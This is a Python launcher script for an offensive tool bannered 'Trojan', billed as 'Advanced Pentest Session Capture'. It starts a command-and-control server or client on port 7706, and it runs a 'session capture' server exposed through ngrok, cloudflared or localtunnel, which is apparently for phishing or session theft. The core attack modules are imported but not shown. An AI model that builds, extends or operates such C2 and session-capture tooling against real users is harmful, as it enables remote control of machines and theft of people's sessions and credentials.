from controller.C2 import C2Server
from helper.session import Session
import os
import sys
import subprocess
import time
import traceback
from colorama import init, Fore, Back, Style
import argparse




init(autoreset=True)

class main(Session):
    def __init__(self, args):
        super().__init__()
        self.args = args
       
        if self.args.mode == "session":
            self.handle_session()
        elif self.args.mode == "c2":
            self.start()

           
   

    def handle_session(self):   
        if self.args.session == "create":
            self.create_tunnel_session()
        elif self.args.session == "list":
            self.list_sessions()

    def create_tunnel_session(self):
        """Launch tunnel capture"""
        print("\n🎣 SESSION CAPTURE TUNNEL")

        tunnel = self.args.tunnel
        if not tunnel:
            print("❌ Invalid tunnel")
            return

        print(f"\n[*] Starting {tunnel} capture server...")
        subprocess.run([sys.executable, "app.py", "--tunnel", tunnel], check=False)


    def start(self):
        try:
            if self.args.type == "server":
                ip = self.args.ip
                port = self.args.port
                print(f"\n[*] 🚀 SERVER on {ip}:{port}")
                self.c2 = C2Server(ip, port)
                self.c2.start_server()
            elif self.args.type == "client":
                ip = self.args.ip
                port = self.args.port
                print(f"\n[*] 🔗 CLIENT → {ip}:{port}")
                self.c2 = C2Server(ip, port)
                self.c2.start_client()
            else:
                print("❌ Invalid option!")

        except KeyboardInterrupt:
            print("\n[*] Returning to menu...")
            
        except Exception as e:
            print(f"\n❌ C2 Error: {e}")
            time.sleep(2)

    def exit(self):
        print("[!] Exiting...")
        os._exit(0)


if __name__ == "__main__":
    print(Fore.RED + Style.BRIGHT +"""
            ████████╗███████╗████████╗ ██████╗███████╗███╗   ██╗
            ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
               ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
               ██║   ██╔══██╗██║   ██║║██  ██║██╔══██║██║╚██╗██║
               ██║   ██║  ██║╚██████╔ ║██████║██║  ██║██║ ╚████║
               ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
               Advanced Pentest Session Capture v3.0
               by Z.hackers Enhanced
     """)

    parser = argparse.ArgumentParser()
    mode = parser.add_subparsers(dest="mode")

    c2_parser =mode.add_parser("c2")
    c2_parser.add_argument("--ip", default="0.0.0.0", type=str, help="0.0.0.0")
    c2_parser.add_argument("--port", default="7706", type=int, help="7706")
    c2_parser.add_argument("--type", default="server", type=str, help="server / client")


    session_parser = mode.add_parser("session")
    session_parser.add_argument("--session", default="Create", type=str, help="list / create")
    session_parser.add_argument("--tunnel", default="localtunnel", type=str, help="ngrok / cloudflared /localtunnel")

     
    args = parser.parse_args()
    main(args)